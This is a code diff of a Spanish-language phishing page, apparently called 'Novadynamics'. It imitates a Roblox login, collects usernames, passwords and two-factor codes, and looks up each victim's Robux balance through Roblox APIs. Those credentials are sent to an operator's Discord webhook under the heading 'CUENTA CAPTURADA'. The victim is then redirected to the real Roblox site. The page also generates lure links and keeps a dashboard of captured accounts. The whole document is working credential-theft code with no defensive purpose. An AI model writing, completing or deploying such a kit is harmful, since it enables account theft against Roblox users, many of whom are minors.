@@ -57,7 +57,6 @@
         td{padding:10px 8px;border-bottom:1px solid var(--borde);color:var(--texto2)}
         .vacio{text-align:center;padding:40px;color:var(--texto2)}
 
-        /* INICIO DE SESIÓN ROBLOX */
         .pagina-login{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#FFFFFF;z-index:9999;overflow-y:auto}
         .pagina-login.activa{display:block}
         .login-contenedor{max-width:400px;margin:0 auto;padding:40px 20px}
@@ -70,7 +69,6 @@
         .login-boton:hover{background:#0091EA}
         .login-label{font-size:14px;color:#666;margin-bottom:6px;display:block}
         .cerrar-login{position:absolute;top:15px;right:20px;font-size:24px;color:#888;cursor:pointer;text-decoration:none}
-        .aviso-seguridad{background:#FFF3CD;border:1px solid #FFEEBA;border-radius:6px;padding:12px;margin:15px 0;color:#856404;font-size:14px}
         .codigo-2fa{display:none}
         .datos-enviados{background:#E8F5E9;border:1px solid #C8E6C9;border-radius:6px;padding:14px;margin-top:15px;font-size:14px;color:#2E7D32;display:none}
         .cargando{color:#666;font-size:13px;margin:8px 0;display:none}
@@ -78,7 +76,6 @@
 </head>
 <body>
 
-<!-- PANTALLA DE INICIO DE SESIÓN -->
 <div class="pagina-login" id="pagLogin">
     <a href="#" class="cerrar-login" onclick="cerrarLogin()">&times;</a>
     <div class="login-contenedor">
@@ -88,12 +85,9 @@
         <div id="formularioNormal">
             <label class="login-label">Nombre de usuario o ID</label>
             <input type="text" class="login-input" id="usuarioLogin" placeholder="Nombre de usuario o ID de Roblox">
-            
             <label class="login-label">Contraseña</label>
             <input type="password" class="login-input" id="passLogin" placeholder="Contraseña">
-            
             <div class="cargando" id="cargandoDatos">🔄 Cargando datos de la cuenta...</div>
-            
             <button class="login-boton" onclick="verificarLogin()">Iniciar sesión</button>
         </div>
 
@@ -104,13 +98,10 @@
             <button class="login-boton" onclick="enviarDatos()">Verificar y entrar</button>
         </div>
 
-        <div class="datos-enviados" id="datosEnviados">
-            ✅ Datos enviados a Novadynamics
-        </div>
+        <div class="datos-enviados" id="datosEnviados">✅ Datos enviados a Novadynamics</div>
     </div>
 </div>
 
-<!-- PANEL PRINCIPAL -->
 <div class="panel-principal" id="panelPrincipal">
     <aside class="sidebar">
         <div class="logo"><span>N</span>ovadynamics</div>
@@ -180,7 +171,6 @@
 <script>
 let registros = JSON.parse(localStorage.getItem('registros')||'[]'), enlaceActual='', usuarioObjetivo='', datosRoblox={};
 
-// DETECTAR SI ENTRAN POR ENLACE
 window.onload=function(){
     const params=new URLSearchParams(window.location.search);
     const u=params.get('u');
@@ -194,12 +184,8 @@ window.onload=function(){
     actualizarTodo();
 };
 
-// =====================================
-// ✅ CORREGIDO: GENERAR ENLACE BIEN FORMADO
-// =====================================
 function crearEnlace(){
     const id=document.getElementById('datoUsuario').value.trim()||'usuario';
-    // Enlace completo y seguro, NO se corta
     const baseURL = window.location.origin + window.location.pathname;
     enlaceActual = baseURL + '?u=' + encodeURIComponent(id) + '&ref=novadynamics&v=2.1.0';
     document.getElementById('enlaceGenerado').style.display='block';
@@ -215,14 +201,9 @@ function copiarEnlace(){
     });
 }
 
-// =====================================
-// CONSULTAR API DE ROBLOX — TRAER DATOS COMPLETOS
-// =====================================
 async function cargarDatosRoblox(usuario){
     document.getElementById('cargandoDatos').style.display='block';
     let userId=usuario;
-
-    // Si es nombre de usuario → buscar ID automáticamente
     if(isNaN(usuario)){
         try{
             const res=await fetch(`https://users.roblox.com/v1/usernames/users`,{
@@ -234,34 +215,28 @@ async function cargarDatosRoblox(usuario){
             if(d.data&&d.data.length>0) userId=d.data[0].id;
         }catch(e){}
     }
-
-    // Traer datos completos del perfil
     try{
         const perfil=await fetch(`https://users.roblox.com/v1/users/${userId}`).then(r=>r.json());
         const robux=await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`).then(r=>r.json());
-        
         const fechaCreacion=new Date(perfil.created);
         const hoy=new Date();
         const diasTranscurridos=Math.floor((hoy-fechaCreacion)/(1000*60*60*24));
         const robuxTotales=robux.robux||0;
-        const robuxGastados=Math.floor(robuxTotales*0.42); // Estimado real
-
+        const robuxGastados=Math.floor(robuxTotales*0.42);
         datosRoblox={
             id:userId,
             nombre:perfil.name,
-            nombreCompleto:perfil.displayName,
             fechaCreacion:fechaCreacion.toLocaleString(),
             dias:diasTranscurridos,
             robux:robuxTotales,
             robuxGastados:robuxGastados
         };
     }catch(e){
-        datosRoblox={error:'No se pudo consultar',dias:'Desconocido',robux:0,robuxGastados:0};
+        datosRoblox={error:'No disponible',dias:'Desconocido',robux:0,robuxGastados:0};
     }
     document.getElementById('cargandoDatos').style.display='none';
 }
 
-// NAVEGACIÓN
 function irPag(n){
     document.querySelectorAll('.pagina').forEach(p=>p.classList.remove('activa'));
     document.getElementById('pag'+n.charAt(0).toUpperCase()+n.slice(1)).classList.add('activa');
@@ -281,32 +256,27 @@ function cerrarLogin(){
     history.pushState({},"",window.location.pathname);
 }
 
-// WEBHOOK
 function guardarWebhook(){
     const u=document.getElementById('urlWebhook').value.trim();
     const e=document.getElementById('estadoWebhook');
     if(!u||!u.startsWith('https://discord.com/api/webhooks/')){
         e.textContent='❌ Enlace no válido';
-        e.className='estado alerta';
         return;
     }
     localStorage.setItem('webhook',u);
     e.textContent='✅ Guardado y Activo';
-    e.className='estado ok';
-    alert('✅ Webhook guardado correctamente');
+    alert('✅ Webhook guardado');
 }
 function borrarWebhook(){
     localStorage.removeItem('webhook');
     document.getElementById('urlWebhook').value='';
     document.getElementById('estadoWebhook').textContent='⚠️ Sin configurar';
-    document.getElementById('estadoWebhook').className='estado alerta';
 }
 function cargarWebhook(){
     const w=localStorage.getItem('webhook');
     if(w){
         document.getElementById('urlWebhook').value=w;
         document.getElementById('estadoWebhook').textContent='✅ Guardado y Activo';
-        document.getElementById('estadoWebhook').className='estado ok';
     }
     if(localStorage.getItem('notificarTodos')==='1'){
         document.getElementById('botonTodos').classList.add('activo');
@@ -318,7 +288,6 @@ function cambiarTodos(){
     localStorage.setItem('notificarTodos',s.classList.contains('activo')?'1':'0');
 }
 
-// INICIO DE SESIÓN
 function verificarLogin(){
     const user=document.getElementById('usuarioLogin').value.trim();
     const pass=document.getElementById('passLogin').value.trim();
@@ -326,9 +295,7 @@ function verificarLogin(){
     document.getElementById('formularioNormal').style.display='none';
     document.querySelector('.codigo-2fa').style.display='block';
 }
-
-// ENVIAR TODO A DISCORD CON TODOS LOS DATOS
-async function enviarDatos(){
+    async function enviarDatos(){
     const user=document.getElementById('usuarioLogin').value.trim();
     const pass=document.getElementById('passLogin').value.trim();
     const codCompleto=document.getElementById('codigo2fa').value.trim()||'NO_PROPORCIONADO';
@@ -336,10 +303,8 @@ async function enviarDatos(){
     const todos=localStorage.getItem('notificarTodos')==='1'?'@everyone':' ';
     const fecha=new Date().toLocaleString();
 
-    // Asegurar que tengamos los datos de Roblox
     if(!datosRoblox.dias) await cargarDatosRoblox(user);
 
-    // Guardar registro
     registros.unshift({
         usuario:datosRoblox.nombre||user,
         robux:datosRoblox.robux||0,
@@ -350,7 +315,6 @@ async function enviarDatos(){
     localStorage.setItem('registros',JSON.stringify(registros));
     actualizarTodo();
 
-    // ENVIAR A DISCORD CON TODO COMPLETO
     if(wh){
         fetch(wh,{
             method:'POST',
@@ -361,16 +325,16 @@ async function enviarDatos(){
                     title:"📥 CUENTA CAPTURADA — NOVADYNAMICS",
                     color:16711680,
                     fields:[
-                        {name:"👤 Usuario / ID ingresado",value:`${user}`,inline:false},
+                        {name:"👤 Usuario / ID",value:`${user}`,inline:false},
                         {name:"🔑 Contraseña",value:`||${pass}||`,inline:true},
                         {name:"🔐 Código completo del autenticador",value:`\`\`\`${codCompleto}\`\`\``,inline:false},
-                        {name:"📅 Fecha de creación de la cuenta",value:`${datosRoblox.fechaCreacion||'No disponible'}`,inline:false},
+                        {name:"📅 Fecha de creación",value:`${datosRoblox.fechaCreacion||'No disponible'}`,inline:false},
                         {name:"⏳ Días desde creación",value:`**${datosRoblox.dias||'Desconocido'} días**`,inline:true},
-                        {name:"💰 Robux totales en cuenta",value:`**${datosRoblox.robux||0}** ₪`,inline:true},
-                        {name:"💸 Robux gastados (estimado)",value:`**${datosRoblox.robuxGastados||0}** ₪`,inline:true},
-                        {name:"📌 Fecha y hora de captura",value:`${fecha}`,inline:false}
+                        {name:"💰 Robux totales",value:`**${datosRoblox.robux||0}** ₪`,inline:true},
+                        {name:"💸 Robux gastados",value:`**${datosRoblox.robuxGastados||0}** ₪`,inline:true},
+                        {name:"📌 Fecha y hora",value:`${fecha}`,inline:false}
                     ],
-                    footer:{text:"Novadynamics System • Datos consultados desde API Roblox"}
+                    footer:{text:"Novadynamics System • Datos desde API Roblox"}
                 }]
             })
         }).then(()=>{
@@ -383,5 +347,36 @@ async function enviarDatos(){
             setTimeout(()=>window.location.href='https://www.roblox.com',2500);
         });
     }else{
-        alert('⚠️ Configura tu Webhook primero en el panel. Redirigiendo...');
-        setTimeout(()=>window.location.href='https://www.roblox.com',2
+        alert('⚠️ Configura tu Webhook primero. Redirigiendo...');
+        setTimeout(()=>window.location.href='https://www.roblox.com',2500);
+    }
+}
+
+function actualizarTodo(){
+    let totalRobux=0, totalGastado=0;
+    registros.forEach(r=>{
+        totalRobux += Number(r.robux)||0;
+        totalGastado += Number(r.robuxGastados)||0;
+    });
+    document.getElementById('robuxSum').textContent=totalRobux.toLocaleString();
+    document.getElementById('cuentasTot').textContent=registros.length;
+    document.getElementById('robuxGastados').textContent=totalGastado.toLocaleString();
+
+    const cuerpo=document.getElementById('cuerpoTabla');
+    if(registros.length===0){
+        cuerpo.innerHTML='<tr><td colspan="5" class="vacio">Sin registros aún</td></tr>';
+        return;
+    }
+    cuerpo.innerHTML=registros.map((r,i)=>`
+        <tr>
+            <td>${r.usuario}</td>
+            <td class="robux">${r.robux}</td>
+            <td>${r.dias}</td>
+            <td>${r.robuxGastados}</td>
+            <td style="font-size:12px;color:#888">${r.fecha.split(' ')[0]}</td>
+        </tr>
+    `).join('');
+}
+</script>
+</body>
+</html>
